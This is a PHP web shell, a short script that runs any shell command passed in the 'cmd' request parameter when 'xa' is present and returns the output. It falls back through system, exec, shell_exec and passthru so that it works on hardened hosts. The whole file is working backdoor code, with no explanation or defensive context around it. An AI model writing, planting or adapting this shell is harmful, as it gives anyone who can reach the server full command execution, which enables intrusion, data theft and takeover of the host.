<?php
function any($x,$y)
{
	return array_key_exists($x,$y);
}

function Execute($x)
{
	$x=$x.' 2>&1';
	if(function_exists('system'))
	{
		ob_start();
		$system=system($x);
		$buff=ob_get_contents();
		ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec'))
	{
		$buff="";
		exec($x,$results);
		foreach($results as $result)
		{
			$buff.=$result;
		}
		return $buff;
	}
	elseif(function_exists('shell_exec'))
	{
		$buff=shell_exec($x);
		return $buff;
	}
	elseif(function_exists('passthru'))
	{
		ob_start();		
		$passthru=passthru($x);
		$buff=ob_get_contents();
		ob_end_clean();	
		return $buff;
	}
	
	return "R.I.P Command";
}

if(any("xa",$_REQUEST))
{	
	ob_clean();
	$command=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";
	@chdir($dir);
	$charset='UTF-8';
			
	$ret=iconv($charset,'UTF-8',Execute($command));
	print $ret;
	exit;
}
?>